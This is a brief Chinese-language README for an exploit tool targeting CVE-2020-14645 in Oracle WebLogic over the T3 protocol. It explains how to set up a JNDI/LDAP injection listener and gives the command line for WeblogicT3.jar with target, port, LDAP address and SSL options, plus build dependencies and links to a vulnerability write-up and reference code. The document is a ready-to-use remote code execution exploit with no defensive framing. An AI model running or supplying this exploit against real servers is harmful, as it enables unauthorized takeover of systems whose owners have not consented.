# CVE-2020-14645

## 使用方法

首先使用[NDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md)监听，并生成一个ldap地址。


`java -jar WeblogicT3.jar -Target 127.0.0.1 -Port [7001] -RMI ldap://127.0.0.1:1389/dozvtq [--SSL]`

-Tatget 和-RMI必填，https可使用--SSL参数，-Port默认7001。

自行编译需要添加coherence.jar和wlfullclient.jar
### 漏洞参考：
https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247484377&idx=1&sn=01d62d175127099275a243ab5fe02bc3&chksm=f9ee6f66ce99e670dbb6da2a3648ea5f6a91fa503441dccd903f44e76883019890d8a9701a29&scene=158#rd
### 代码参考：
https://github.com/Y4er/CVE-2020-2883